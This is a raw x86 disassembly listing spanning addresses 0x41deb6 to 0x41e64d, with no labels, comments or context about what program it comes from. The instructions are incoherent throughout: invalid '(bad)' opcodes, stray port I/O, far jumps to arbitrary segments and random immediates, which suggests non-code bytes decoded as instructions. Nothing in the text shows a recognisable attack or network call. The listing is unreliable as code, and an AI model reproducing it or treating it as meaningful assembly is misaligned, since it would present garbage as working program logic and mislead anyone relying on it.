  41deb6:	cmp    ecx,DWORD PTR [edi-0x50]
  41deb9:	adc    DWORD PTR [ebx],edi
  41debb:	push   cs
  41debc:	adc    BYTE PTR [ecx-0x5a26dd4a],al
  41dec2:	outs   dx,DWORD PTR ds:[esi]
  41dec3:	lock (bad) [esi-0x3]
  41dec7:	cmp    eax,0x65420cad
  41decc:	paddd  mm3,QWORD PTR [ebx+ecx*8]
  41ded0:	mov    bh,0x98
  41ded2:	mov    ebx,0x5f408a04
  41ded7:	ret    0x7763
  41deda:	cdq    
  41dedb:	inc    ecx
  41dedc:	pop    edx
  41dedd:	pusha  
  41dede:	aad    0x23
  41dee0:	push   esp
  41dee1:	push   esp
  41dee2:	je     0x41df5e
  41dee4:	cli    
  41dee5:	jecxz  0x41df1e
  41dee7:	sbb    ch,BYTE PTR [ebx+ecx*8-0x12]
  41deeb:	ror    BYTE PTR [ecx+0x5e],cl
  41deee:	aam    0xf0
  41def0:	inc    ebp
  41def1:	les    edx,FWORD PTR [edi+0x9bc4909]
  41def7:	add    eax,0xc65b0d82
  41defc:	mov    bl,BYTE PTR [ebx-0x2b]
  41deff:	pop    es
  41df00:	mov    ds:0xaa0df4f6,eax
  41df05:	test   eax,0xa984ca6e
  41df0a:	in     eax,dx
  41df0b:	js     0x41df11
  41df0d:	sub    DWORD PTR [edi-0x62c4e3fd],esp
  41df13:	fidiv  DWORD PTR [esi-0x55]
  41df16:	repnz repz adc eax,ecx
  41df1a:	mov    ds:0x756e396d,al
  41df1f:	nop
  41df20:	bound  ecx,QWORD PTR [ebp+esi*1-0x577be35d]
  41df27:	loopne 0x41debd
  41df29:	cmp    DWORD PTR [esi+0x319abf34],esi
  41df2f:	out    dx,al
  41df30:	test   BYTE PTR [edi+edx*4+0x75c1cb9d],bl
  41df37:	mov    bl,0x93
  41df39:	adc    al,0xaf
  41df3b:	and    ch,BYTE PTR [ebx-0x7a]
  41df3e:	fist   DWORD PTR [esi+0x4e]
  41df41:	push   ecx
  41df42:	cdq    
  41df43:	cmp    cl,BYTE PTR [ebx+edi*4-0x37]
  41df47:	es push edi
  41df49:	mov    cl,dl
  41df4b:	mov    dh,0x36
  41df4d:	xchg   DWORD PTR [edx-0x1c15750e],ecx
  41df53:	neg    BYTE PTR [ebp*1+0x678b9bc7]
  41df5a:	dec    eax
  41df5b:	mov    ch,BYTE PTR [edi+0x4f]
  41df5e:	cs cli 
  41df60:	sub    al,ch
  41df62:	push   cs
  41df63:	int    0x5a
  41df65:	loopne 0x41df1a
  41df67:	sar    BYTE PTR [eax],0x51
  41df6a:	pop    esi
  41df6b:	out    dx,al
  41df6c:	xlat   BYTE PTR ds:[ebx]
  41df6d:	jmp    0x8acafd4c
  41df72:	sub    al,0x25
  41df74:	cmp    BYTE PTR [ecx],bl
  41df76:	shl    DWORD PTR [ecx+0x2e],0x4f
  41df7a:	in     al,dx
  41df7b:	jmp    0x41df5c
  41df7d:	jb     0x41dfba
  41df7f:	xor    BYTE PTR [eax+0x54],ah
  41df82:	and    al,0xb0
  41df84:	daa    
  41df85:	sar    edi,cl
  41df87:	das    
  41df88:	add    ch,ah
  41df8a:	fnsave [ebx+ebp*4]
  41df8d:	mov    ebp,0xd5aebe3b
  41df92:	in     al,dx
  41df93:	mov    eax,gs:0x6573cd99
  41df99:	into   
  41df9a:	dec    esi
  41df9b:	dec    ebx
  41df9c:	jne    0x41e018
  41df9e:	sub    DWORD PTR [ebp-0x6926c77b],0xffffffb1
  41dfa5:	inc    ecx
  41dfa6:	arpl   si,bx
  41dfa8:	out    dx,al
  41dfa9:	jnp    0x41df71
  41dfab:	xchg   esi,eax
  41dfac:	mov    WORD PTR [edi],?
  41dfae:	sti    
  41dfaf:	or     dh,BYTE PTR [esi]
  41dfb1:	gs repnz mov ah,0x54
  41dfb5:	ins    BYTE PTR es:[edi],dx
  41dfb6:	push   ds
  41dfb7:	mov    bh,0x2a
  41dfb9:	inc    ecx
  41dfba:	push   esp
  41dfbb:	sub    eax,0xf7f0372e
  41dfc0:	shl    BYTE PTR [ecx-0x21e67ce5],cl
  41dfc6:	mov    ds:0xe542273b,al
  41dfcb:	sbb    dl,BYTE PTR [eax+0x6b3ebb1e]
  41dfd1:	test   DWORD PTR [esi-0x4f],edx
  41dfd4:	fsubr  st(5),st
  41dfd6:	fld    QWORD PTR [ebp+ebx*8-0x650687bc]
  41dfdd:	jp     0x41df9c
  41dfdf:	imul   edx,DWORD PTR [edi+eiz*8+0xfc47167],0xe2c9cf9a
  41dfea:	mov    eax,0xbda2ecd4
  41dfef:	jmp    0x8241028b
  41dff4:	or     eax,0x4627d8d7
  41dff9:	and    BYTE PTR [ecx],bh
  41dffb:	xor    al,0x86
  41dffd:	shl    DWORD PTR [ebx+esi*2-0x76],1
  41e001:	jle    0x41dff3
  41e003:	das    
  41e004:	into   
  41e005:	popa   
  41e006:	push   ds
  41e007:	loop   0x41dfbf
  41e009:	sbb    eax,0x3d948175
  41e00e:	inc    ebx
  41e00f:	mov    WORD PTR [eax-0x37],es
  41e012:	faddp  st(4),st
  41e014:	push   0xef9669ae
  41e019:	add    eax,0xba50cc89
  41e01e:	jo     0x41e02b
  41e020:	test   edx,esi
  41e022:	ja     0x41dff1
  41e024:	and    eax,esp
  41e026:	sub    eax,DWORD PTR [edx]
  41e028:	fist   WORD PTR ds:0xca47b265
  41e02e:	sub    edi,DWORD PTR [ecx+ebp*8+0x3f5b7210]
  41e035:	scas   eax,DWORD PTR es:[edi]
  41e036:	inc    eax
  41e037:	cmp    DWORD PTR [esi+edx*8],esi
  41e03a:	inc    ecx
  41e03b:	fisubr WORD PTR [ebp+0x34]
  41e03e:	test   BYTE PTR [edx],ch
  41e040:	jmp    0x4f73753a
  41e045:	sub    dh,BYTE PTR [esi]
  41e047:	pushw  0x5f8
  41e04b:	icebp  
  41e04c:	jb     0x41e03f
  41e04e:	imul   ebp,DWORD PTR [eax+0x27],0xffffffc2
  41e052:	cmp    ch,BYTE PTR [ebp+ebx*8-0x63]
  41e056:	cmp    eax,0x8a852098
  41e05b:	add    eax,0x587060c3
  41e060:	sbb    eax,0xf8e1caa8
  41e065:	fldcw  WORD PTR [esi]
  41e067:	inc    ebx
  41e068:	xchg   DWORD PTR [ecx],eax
  41e06a:	mov    eax,ds:0x57a2e56b
  41e06f:	test   BYTE PTR [edi-0x7b2370c3],bl
  41e075:	repz jecxz 0x41e00a
  41e078:	out    0x66,al
  41e07a:	sub    BYTE PTR [eax+0x12],ch
  41e07d:	push   eax
  41e07e:	mov    ecx,0xa1176209
  41e083:	jae    0x41e007
  41e085:	pop    ss
  41e086:	std    
  41e087:	js     0x41e0da
  41e089:	jmp    0x803e6296
  41e08e:	(bad)  
  41e08f:	adc    al,0x47
  41e091:	pop    esp
  41e092:	or     BYTE PTR [eax-0x760ae915],ch
  41e098:	mov    edx,0x28ece37b
  41e09d:	outs   dx,DWORD PTR ds:[esi]
  41e09e:	popf   
  41e09f:	pusha  
  41e0a0:	fldcw  WORD PTR [edx-0x6a]
  41e0a3:	icebp  
  41e0a4:	xor    BYTE PTR [esi-0x6e5b478c],0xcb
  41e0ab:	pushf  
  41e0ac:	lea    ecx,[edx]
  41e0ae:	xchg   esi,eax
  41e0af:	out    0x1a,eax
  41e0b1:	mov    eax,0x365fa657
  41e0b6:	into   
  41e0b7:	mov    ch,0xf0
  41e0b9:	ins    DWORD PTR es:[edi],dx
  41e0ba:	jecxz  0x41e0fb
  41e0bc:	push   eax
  41e0bd:	loop   0x41e0f1
  41e0bf:	mov    al,ds:0x953544c
  41e0c4:	push   0xffffffa6
  41e0c6:	add    DWORD PTR ds:0x8a254159,esi
  41e0cc:	jno    0x41e0b8
  41e0ce:	xor    eax,esp
  41e0d0:	push   ebx
  41e0d1:	lahf   
  41e0d2:	pop    esp
  41e0d3:	ret    
  41e0d4:	stc    
  41e0d5:	add    BYTE PTR [edi-0xa8fdf72],bh
  41e0db:	psrad  mm2,QWORD PTR [edi]
  41e0de:	inc    ecx
  41e0df:	mov    ebp,0x89f50898
  41e0e4:	inc    ebp
  41e0e5:	sub    dl,BYTE PTR [esi-0x29]
  41e0e8:	adc    al,0xf8
  41e0ea:	jmp    0x745f:0x78b19f1d
  41e0f1:	fwait
  41e0f2:	scas   al,BYTE PTR es:[edi]
  41e0f3:	dec    ebp
  41e0f4:	lahf   
  41e0f5:	push   ebx
  41e0f6:	jo     0x41e167
  41e0f8:	out    dx,al
  41e0f9:	mov    esi,0x75603e3f
  41e0fe:	pop    eax
  41e0ff:	ss pop ebp
  41e101:	in     eax,dx
  41e102:	nop
  41e103:	repz shl DWORD PTR [edx-0x1155e48],cl
  41e10a:	xor    ch,BYTE PTR [eax-0x48a1b74b]
  41e110:	mul    DWORD PTR [ecx+0x4df6c8ae]
  41e116:	jne    0x41e126
  41e118:	test   al,0x32
  41e11a:	jnp    0x41e127
  41e11c:	push   ebp
  41e11d:	add    ah,bl
  41e11f:	push   edi
  41e120:	add    al,cl
  41e122:	sub    edi,ecx
  41e124:	inc    edx
  41e125:	xor    DWORD PTR [edi],edx
  41e127:	jne    0x41e0dc
  41e129:	and    BYTE PTR [esi],cl
  41e12b:	jae    0x41e147
  41e12d:	xchg   esi,eax
  41e12e:	mov    edi,0x5c456cc2
  41e133:	fcom   QWORD PTR [edi]
  41e135:	xchg   ebp,eax
  41e136:	xchg   ebx,eax
  41e137:	sbb    DWORD PTR [edx],ebx
  41e139:	dec    ecx
  41e13a:	mov    bh,0x96
  41e13c:	cmp    esi,ebp
  41e13e:	loope  0x41e0fa
  41e140:	cli    
  41e141:	mov    DWORD PTR [ecx+0x30],esi
  41e144:	nop
  41e145:	sar    DWORD PTR [eax],0xfc
  41e148:	ret    
  41e149:	in     al,dx
  41e14a:	daa    
  41e14b:	aam    0x0
  41e14d:	or     al,0xcb
  41e14f:	adc    al,BYTE PTR [edx+0x3f95de6e]
  41e155:	arpl   WORD PTR [edi+0x2fee299b],dx
  41e15b:	mov    ds:0x5e5504c0,al
  41e160:	lds    edx,FWORD PTR [edx-0x8fdea1f]
  41e166:	scas   al,BYTE PTR es:[edi]
  41e167:	jmp    0x8bca2776
  41e16c:	mov    ds:0x1b3acaad,eax
  41e171:	push   esi
  41e172:	mov    al,0x58
  41e174:	in     al,dx
  41e175:	and    ah,BYTE PTR ds:[ebp-0x47]
  41e179:	cmp    DWORD PTR [edi-0x4667874f],edx
  41e17f:	sbb    al,0x6c
  41e181:	push   es
  41e182:	xchg   BYTE PTR [eax+0x50a8bf52],bh
  41e188:	xor    ebx,DWORD PTR [eax-0xba76936]
  41e18e:	sub    ecx,edi
  41e190:	scas   al,BYTE PTR es:[edi]
  41e191:	cdq    
  41e192:	loopne 0x41e1c4
  41e194:	stos   DWORD PTR es:[edi],eax
  41e195:	(bad)  
  41e196:	in     al,0xcc
  41e198:	sub    al,0x7
  41e19a:	xor    ebx,eax
  41e19c:	sbb    ebx,DWORD PTR [esi]
  41e19e:	ret    0x63a5
  41e1a1:	pop    ebp
  41e1a2:	enter  0x3162,0xa2
  41e1a6:	pop    ebp
  41e1a7:	sub    eax,0x5ab3a2a8
  41e1ac:	mov    esi,0x61a299c6
  41e1b1:	pop    edx
  41e1b2:	cmp    eax,0x64f613c
  41e1b7:	cmp    al,BYTE PTR [edx]
  41e1b9:	or     eax,0xa6d5a0bd
  41e1be:	jp     0x41e1c6
  41e1c0:	rcr    ebx,0x11
  41e1c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1c4:	inc    ecx
  41e1c5:	cmp    esp,DWORD PTR [edi-0x75]
  41e1c8:	js     0x41e220
  41e1ca:	jmp    0xbac8:0x8ef60ed3
  41e1d1:	lods   eax,DWORD PTR ds:[esi]
  41e1d2:	mov    bl,dl
  41e1d4:	pop    eax
  41e1d5:	cmp    al,0x6b
  41e1d7:	inc    ebx
  41e1d8:	pop    edi
  41e1d9:	pop    ebp
  41e1da:	cwde   
  41e1db:	fwait
  41e1dc:	mov    dh,0x36
  41e1de:	loopne 0x41e25f
  41e1e0:	adc    DWORD PTR [ecx+eiz*4],0xffffffd6
  41e1e4:	jl     0x41e23b
  41e1e6:	fld    QWORD PTR [esi]
  41e1e8:	daa    
  41e1e9:	sbb    al,ch
  41e1eb:	ja     0x41e1ee
  41e1ed:	cmp    al,0xf2
  41e1ef:	xchg   edx,eax
  41e1f0:	fiadd  DWORD PTR [eax-0x22bdefa7]
  41e1f6:	or     eax,0xea6a000a
  41e1fb:	repnz fs int 0x84
  41e1ff:	pop    ecx
  41e200:	mov    ebp,0x2742e1c8
  41e205:	fcmovnbe st,st(5)
  41e207:	shl    DWORD PTR [ecx+edx*4+0x31],1
  41e20b:	std    
  41e20c:	pop    es
  41e20d:	(bad)  
  41e20e:	sub    dl,BYTE PTR [ecx-0x72]
  41e211:	cmp    DWORD PTR [edi+eiz*1-0x7624ce3f],0x480a122a
  41e21c:	inc    edi
  41e21d:	test   eax,0xb8a19945
  41e222:	mov    al,ds:0xdcd6323a
  41e227:	sub    al,0xb
  41e229:	cs jnp 0x41e236
  41e22c:	call   0x5590:0xe46e2e5a
  41e233:	lods   eax,DWORD PTR ds:[esi]
  41e234:	xchg   edi,eax
  41e235:	adc    ah,0xfa
  41e238:	dec    esi
  41e239:	xor    ecx,esp
  41e23b:	cmove  esi,DWORD PTR [esi+0x66]
  41e23f:	pop    ss
  41e240:	dec    ebp
  41e241:	mov    BYTE PTR [esi-0x7b19fa94],al
  41e247:	ja     0x41e1f3
  41e249:	jb     0x41e24b
  41e24b:	jg     0x41e252
  41e24d:	hlt    
  41e24e:	jg     0x41e259
  41e250:	ficomp WORD PTR [ebx-0x62]
  41e253:	xchg   ebp,eax
  41e254:	dec    ebp
  41e255:	inc    ebp
  41e256:	cmp    al,0x27
  41e258:	pop    esp
  41e259:	stos   BYTE PTR es:[edi],al
  41e25a:	jmp    0xafc1:0xb23cfe05
  41e261:	dec    eax
  41e262:	jnp    0x41e22b
  41e264:	mov    BYTE PTR [ebp+0x6390276e],cl
  41e26a:	in     al,dx
  41e26b:	imul   ecx,DWORD PTR [edx+0x3],0x8c451c6e
  41e272:	ret    0x8fed
  41e275:	pushf  
  41e276:	inc    ebp
  41e277:	in     eax,dx
  41e278:	or     eax,0x2a78be20
  41e27d:	sbb    DWORD PTR [esi-0xa],esi
  41e280:	dec    ebp
  41e281:	lods   al,BYTE PTR ds:[esi]
  41e282:	pushf  
  41e283:	lods   al,BYTE PTR ds:[esi]
  41e284:	retf   0x8488
  41e287:	adc    dh,BYTE PTR [edi]
  41e289:	inc    esp
  41e28a:	stc    
  41e28b:	push   es
  41e28c:	std    
  41e28d:	sbb    al,0x6d
  41e28f:	les    esi,FWORD PTR [esi]
  41e291:	(bad)  
  41e292:	repnz push 0xf79797cc
  41e298:	in     al,0x38
  41e29a:	loope  0x41e242
  41e29c:	xchg   ebx,eax
  41e29d:	aam    0x19
  41e29f:	mov    ebp,0x9cb0633f
  41e2a4:	inc    ebp
  41e2a5:	pop    esi
  41e2a6:	adc    DWORD PTR [edx-0x18],ebx
  41e2a9:	adc    ah,BYTE PTR [edi+0xe]
  41e2ac:	in     al,dx
  41e2ad:	dec    esp
  41e2ae:	fucomip st,st(7)
  41e2b0:	lods   eax,DWORD PTR ds:[esi]
  41e2b1:	repnz inc esi
  41e2b3:	or     BYTE PTR [edi+0x28],0x16
  41e2b7:	and    DWORD PTR [eax-0x6bdbba69],ebx
  41e2bd:	add    eax,0x380d57df
  41e2c2:	xor    al,0xf6
  41e2c4:	dec    ebx
  41e2c5:	pop    ss
  41e2c6:	(bad)  
  41e2c7:	psubw  mm7,QWORD PTR [edx]
  41e2ca:	xchg   edi,eax
  41e2cb:	jae    0x41e2de
  41e2cd:	push   edx
  41e2ce:	in     al,dx
  41e2cf:	cmp    DWORD PTR [edi-0x205ec301],edx
  41e2d5:	cmp    bl,BYTE PTR ds:0x309aadfd
  41e2db:	shl    BYTE PTR [ebx-0x4a],1
  41e2de:	addr16 mov eax,ds:0x3ef1
  41e2e2:	inc    ebx
  41e2e3:	icebp  
  41e2e4:	jns    0x41e2f6
  41e2e6:	(bad)  
  41e2e7:	das    
  41e2e8:	sbb    esi,DWORD PTR [esi+0x61]
  41e2eb:	int    0x1
  41e2ed:	(bad)  
  41e2ee:	fstp   DWORD PTR [edi-0x36]
  41e2f1:	xlat   BYTE PTR ds:[ebx]
  41e2f2:	push   ebx
  41e2f3:	mov    al,ds:0x3787bed1
  41e2f8:	scas   al,BYTE PTR es:[edi]
  41e2f9:	adc    DWORD PTR [edi],0xffffffe6
  41e2fc:	sbb    eax,0x37be4e8
  41e301:	and    al,0x5f
  41e303:	xchg   ebp,eax
  41e304:	fild   WORD PTR [ecx-0x28]
  41e307:	xchg   edx,eax
  41e308:	sub    al,0xda
  41e30a:	sar    DWORD PTR [eax+ebp*8],cl
  41e30d:	pushf  
  41e30e:	(bad)  
  41e30f:	sar    DWORD PTR [ecx],cl
  41e311:	push   edi
  41e312:	inc    eax
  41e313:	dec    edi
  41e314:	and    eax,0xc8da0d07
  41e319:	mov    cl,0x9b
  41e31b:	cmp    BYTE PTR [ebx+0x68],0x2
  41e31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e320:	xchg   ecx,eax
  41e321:	xor    al,0x69
  41e324:	pop    edx
  41e325:	inc    ecx
  41e326:	(bad)  
  41e327:	xor    al,BYTE PTR [eax+ebp*4+0x7a]
  41e32b:	repz test al,0xcc
  41e32e:	xchg   edx,eax
  41e32f:	or     BYTE PTR [edi-0x21],bh
  41e332:	and    BYTE PTR ds:0xf758347f,al
  41e338:	dec    DWORD PTR [ebp+0x44]
  41e33b:	pop    ebp
  41e33c:	fmul   DWORD PTR ds:0x10f4bc9b
  41e342:	jl     0x41e2fc
  41e344:	aam    0xf8
  41e346:	xchg   edi,eax
  41e347:	mov    ds:0x79fec64b,al
  41e34c:	clc    
  41e34d:	mov    ch,0xc4
  41e34f:	inc    ebx
  41e350:	rcl    BYTE PTR [edi],cl
  41e352:	es inc edx
  41e354:	fbstp  TBYTE PTR [edx+0x416a9e49]
  41e35a:	das    
  41e35b:	scas   al,BYTE PTR es:[edi]
  41e35c:	js     0x41e3b9
  41e35e:	dec    esi
  41e35f:	add    BYTE PTR [esp+esi*4-0x48c86dbd],bl
  41e366:	mov    ch,BYTE PTR [ecx+ebx*4+0x1236726d]
  41e36d:	(bad)  
  41e36f:	inc    edi
  41e370:	leave  
  41e371:	scas   eax,DWORD PTR es:[edi]
  41e372:	sti    
  41e373:	xchg   esp,eax
  41e374:	cmp    esp,esi
  41e376:	shl    BYTE PTR [edi-0x2dca21d7],0x29
  41e37d:	adc    edx,DWORD PTR [eax+0x73]
  41e380:	ror    DWORD PTR [edx-0x55],1
  41e383:	pop    es
  41e384:	call   0x8aab:0xb00679b4
  41e38b:	into   
  41e38c:	pop    ds
  41e38d:	shl    DWORD PTR [eax-0x275a4fcb],1
  41e393:	dec    edx
  41e394:	enter  0xf2fc,0x32
  41e398:	inc    esp
  41e399:	je     0x41e3dd
  41e39b:	push   ecx
  41e39c:	call   0xf1a4dfca
  41e3a1:	mul    DWORD PTR [edx-0x65]
  41e3a4:	test   al,0x2b
  41e3a6:	mov    esp,0x4637a38e
  41e3ab:	std    
  41e3ac:	push   esi
  41e3ad:	xlat   BYTE PTR ds:[ebx]
  41e3ae:	dec    eax
  41e3af:	xor    al,0x4c
  41e3b1:	pop    ss
  41e3b2:	and    bl,al
  41e3b4:	and    edi,DWORD PTR [eax-0x37048f60]
  41e3ba:	in     al,0xdd
  41e3bc:	pop    edx
  41e3bd:	push   0x768c8705
  41e3c2:	or     ecx,DWORD PTR [eax-0x55]
  41e3c5:	jmp    0x13312bcb
  41e3ca:	cs sbb eax,0xa5bf31df
  41e3d0:	test   BYTE PTR ds:0x4fae72a5,ah
  41e3d6:	in     eax,0xf0
  41e3d8:	mov    al,ds:0x1b9b9f52
  41e3dd:	inc    esi
  41e3de:	pushf  
  41e3df:	daa    
  41e3e0:	cdq    
  41e3e1:	jns    0x41e39a
  41e3e3:	mov    cl,0x9b
  41e3e5:	or     DWORD PTR [ebx-0x468de569],eax
  41e3eb:	pop    edx
  41e3ec:	imul   eax,DWORD PTR ds:[ebx-0x67f541d8],0x2c9e3318
  41e3f7:	retf   
  41e3f8:	aam    0xea
  41e3fa:	ror    BYTE PTR [eax-0x2847f3c6],1
  41e400:	mov    BYTE PTR [edi-0x40bbaa7],bh
  41e406:	or     ebp,DWORD PTR [ebx]
  41e408:	push   ecx
  41e409:	pop    ds
  41e40a:	and    ecx,DWORD PTR [esi-0x22]
  41e40d:	pop    edx
  41e40e:	lahf   
  41e40f:	fisubr WORD PTR [eax]
  41e411:	pop    eax
  41e412:	scas   al,BYTE PTR es:[edi]
  41e413:	pop    esp
  41e414:	cmp    DWORD PTR [edi],0x18
  41e417:	jg     0x41e39a
  41e419:	mov    al,0x35
  41e41b:	lahf   
  41e41c:	ds sbb edi,eax
  41e41f:	in     al,0x75
  41e421:	test   ah,ah
  41e423:	loope  0x41e412
  41e425:	push   eax
  41e426:	xor    bl,BYTE PTR [esi+0x51644d65]
  41e42c:	jns    0x41e3ed
  41e42e:	mov    WORD PTR [edi-0x72],ds
  41e431:	jmp    FWORD PTR [ebx-0x26ea1274]
  41e437:	loopne 0x41e41e
  41e439:	push   esp
  41e43a:	into   
  41e43b:	mov    bl,BYTE PTR [edx+eax*4]
  41e43e:	push   ebp
  41e43f:	daa    
  41e440:	loop   0x41e4b7
  41e442:	sahf   
  41e443:	(bad)  
  41e444:	mov    WORD PTR [esi],?
  41e446:	mov    ds:0x1db6085d,eax
  41e44b:	in     al,0x4c
  41e44d:	push   ebx
  41e44e:	lods   eax,DWORD PTR ds:[esi]
  41e44f:	fisttp WORD PTR [edi+0x4de0fd3e]
  41e455:	push   cs
  41e456:	adc    edx,DWORD PTR [ebx-0x54]
  41e459:	arpl   WORD PTR [ebx+0x3928441c],cx
  41e45f:	xor    al,0x18
  41e461:	and    al,0x81
  41e463:	xchg   edi,eax
  41e464:	add    BYTE PTR [esi-0x34],ah
  41e467:	cmp    esi,ecx
  41e469:	inc    ebp
  41e46a:	imul   ebx,esp,0xd9f5980b
  41e470:	lea    ecx,[ebx]
  41e472:	pop    es
  41e473:	dec    esp
  41e474:	jo     0x41e4da
  41e476:	popa   
  41e477:	leave  
  41e478:	not    BYTE PTR [esi]
  41e47a:	dec    edx
  41e47b:	outs   dx,DWORD PTR ds:[esi]
  41e47c:	rol    BYTE PTR [ecx+0x4d],0x23
  41e480:	push   cs
  41e481:	and    eax,0x81b41539
  41e486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e487:	mov    esp,0xdfb680de
  41e48c:	retf   0x1d7b
  41e48f:	fiadd  WORD PTR [ebx]
  41e491:	push   es
  41e492:	mov    ch,0x80
  41e494:	rol    BYTE PTR [eax+0x1d],0x32
  41e498:	outs   dx,BYTE PTR ds:[esi]
  41e499:	mov    ds:0x846665dc,eax
  41e49e:	int3   
  41e49f:	pop    esp
  41e4a0:	xor    al,0x9c
  41e4a2:	pop    edx
  41e4a3:	and    al,0xd9
  41e4a5:	leave  
  41e4a6:	push   es
  41e4a7:	pusha  
  41e4a8:	xchg   ecx,eax
  41e4a9:	stc    
  41e4aa:	jmp    0x3497:0x3d8f8925
  41e4b1:	or     BYTE PTR [edi-0x48],dh
  41e4b4:	xor    al,0xcb
  41e4b6:	mov    ch,0xf2
  41e4b8:	fwait
  41e4b9:	inc    ebx
  41e4ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4bb:	loope  0x41e4e6
  41e4bd:	ins    DWORD PTR es:[edi],dx
  41e4be:	loope  0x41e49a
  41e4c0:	or     al,0x76
  41e4c2:	out    0x6a,al
  41e4c4:	jmp    0x6e0acbc9
  41e4c9:	add    ebx,DWORD PTR [eax-0x11a95f5e]
  41e4cf:	test   BYTE PTR [ebx+0x23],ah
  41e4d2:	adc    eax,0x6c00884f
  41e4d7:	add    DWORD PTR [edx+0x52e80d37],0xbb960fa9
  41e4e1:	pop    ecx
  41e4e2:	inc    ebp
  41e4e3:	jge    0x41e473
  41e4e5:	scas   al,BYTE PTR es:[edi]
  41e4e6:	fcos   
  41e4e8:	dec    esi
  41e4e9:	mov    ah,0xfd
  41e4eb:	pop    edi
  41e4ec:	jb     0x41e4b7
  41e4ee:	sbb    eax,0x79065d68
  41e4f3:	cmc    
  41e4f4:	adc    BYTE PTR [esi],bh
  41e4f6:	sub    al,0x7c
  41e4f8:	jmp    0x6171836d
  41e4fd:	jmp    0x311c:0x6aedaf11
  41e504:	lahf   
  41e505:	or     edi,esp
  41e507:	sahf   
  41e508:	jnp    0x41e4b0
  41e50a:	ins    DWORD PTR es:[edi],dx
  41e50b:	cmp    BYTE PTR [edi],al
  41e50d:	push   ecx
  41e50e:	into   
  41e50f:	xor    al,0x87
  41e511:	cld    
  41e512:	xchg   ebx,eax
  41e513:	sub    BYTE PTR [edx+0x584082d9],ch
  41e519:	(bad)  
  41e51a:	ficomp DWORD PTR [ecx]
  41e51c:	adc    BYTE PTR [edx],al
  41e51e:	mov    al,ds:0x24db6fc1
  41e523:	mov    edx,0xbd9158f5
  41e528:	pop    ss
  41e529:	ds ins DWORD PTR es:[edi],dx
  41e52b:	fdivp  st(7),st
  41e52d:	push   cs
  41e52e:	mov    dl,0xd9
  41e530:	nop
  41e531:	push   ss
  41e532:	and    DWORD PTR [edx+0x21],ecx
  41e535:	rol    DWORD PTR [edi+0x2e],1
  41e538:	xchg   edx,eax
  41e539:	call   0xa71:0xdfb618b3
  41e540:	hlt    
  41e541:	mov    gs,WORD PTR [ebx+0x1cf313aa]
  41e547:	data16 jno 0x41e4e8
  41e54a:	add    al,BYTE PTR [eax-0x66]
  41e54d:	rcl    dl,1
  41e54f:	and    DWORD PTR [ebx],ebx
  41e551:	sub    esp,DWORD PTR [ebp+0x536bf60e]
  41e557:	pushf  
  41e558:	xchg   esp,eax
  41e559:	ficomp DWORD PTR [esi+0x24]
  41e55c:	mov    ds:0x2b55521c,eax
  41e561:	push   edx
  41e562:	cdq    
  41e563:	sub    edx,esi
  41e565:	jno    0x41e506
  41e567:	cli    
  41e568:	fwait
  41e569:	test   eax,edi
  41e56b:	shl    BYTE PTR [esi-0x58a6e91b],1
  41e571:	in     eax,0xd4
  41e573:	lods   eax,DWORD PTR ds:[esi]
  41e574:	xor    al,0xc8
  41e576:	(bad)  
  41e577:	push   ecx
  41e578:	or     eax,0x6a18d45b
  41e57d:	(bad)  [ebx-0x4e7c9a5]
  41e583:	and    al,0x2
  41e585:	and    eax,0x43
  41e588:	mov    WORD PTR [ebx-0x55],ss
  41e58b:	dec    ecx
  41e58c:	adc    DWORD PTR [eax-0x24],edx
  41e58f:	inc    ecx
  41e590:	inc    esp
  41e591:	imul   edi,DWORD PTR [edx-0x1b],0xaec7f84e
  41e598:	cld    
  41e599:	xchg   BYTE PTR [esi],bl
  41e59b:	into   
  41e59c:	inc    eax
  41e59d:	xor    cl,BYTE PTR [edx+0x2]
  41e5a0:	mov    edi,0xa4660ae8
  41e5a5:	cli    
  41e5a6:	mov    cs,WORD PTR [esi+0x31]
  41e5a9:	inc    dh
  41e5ab:	enter  0xf6e2,0x8b
  41e5af:	dec    edx
  41e5b0:	shl    DWORD PTR [edi-0x46862d4e],1
  41e5b6:	inc    ebp
  41e5b7:	dec    esi
  41e5b8:	mov    esp,0x3a57c219
  41e5bd:	ret    
  41e5be:	xchg   edi,eax
  41e5bf:	enter  0x4f28,0x41
  41e5c3:	mov    bh,BYTE PTR [ebx+0x7c]
  41e5c6:	inc    ebx
  41e5c7:	mov    eax,ds:0xb67284df
  41e5cc:	mov    edx,DWORD PTR [ecx+0x1d63d844]
  41e5d2:	mov    ?,WORD PTR [eax+0x36]
  41e5d5:	ficomp DWORD PTR [esi]
  41e5d7:	(bad)  
  41e5d8:	and    edx,DWORD PTR [eax]
  41e5da:	adc    ebp,DWORD PTR [ecx]
  41e5dc:	mov    bl,0xda
  41e5de:	and    eax,0x49fcc13d
  41e5e3:	push   edi
  41e5e4:	test   al,0x37
  41e5e6:	ret    
  41e5e7:	inc    eax
  41e5e8:	rol    DWORD PTR [eax],0x6e
  41e5eb:	out    0xa2,eax
  41e5ed:	sbb    edi,DWORD PTR [esi+eiz*8-0x3249572a]
  41e5f4:	call   0xe663:0xeb34c73b
  41e5fb:	jmp    0x41e649
  41e5fd:	idiv   BYTE PTR [ecx-0xb247a8d]
  41e603:	mov    cl,0xaf
  41e605:	pop    es
  41e606:	add    ecx,0xc4de90ef
  41e60c:	lahf   
  41e60d:	push   ebp
  41e60e:	mov    ebx,0x3fb160db
  41e613:	sbb    al,0xf7
  41e615:	loope  0x41e619
  41e617:	and    bh,BYTE PTR [edx-0x48]
  41e61a:	test   eax,0x1f991b5d
  41e61f:	mov    dl,0xfb
  41e621:	(bad)  
  41e622:	out    0xfd,eax
  41e624:	sub    esi,eax
  41e626:	ss inc esp
  41e628:	rcr    BYTE PTR [edi+0x68],1
  41e62b:	(bad)  
  41e62c:	neg    DWORD PTR [eax+edx*4+0x75]
  41e630:	cld    
  41e631:	dec    esp
  41e632:	dec    edx
  41e633:	xor    eax,0x18e2df47
  41e638:	push   ebx
  41e639:	pop    eax
  41e63a:	add    al,0x66
  41e63c:	stos   DWORD PTR es:[edi],eax
  41e63d:	mov    dl,0xf
  41e63f:	rcl    bh,0x0
  41e642:	xlat   BYTE PTR ds:[ebx]
  41e643:	in     eax,0x46
  41e645:	mov    bh,0xc9
  41e647:	xor    DWORD PTR [esi-0x246fd2c9],ebp
  41e64d:	call   0x1628cabf
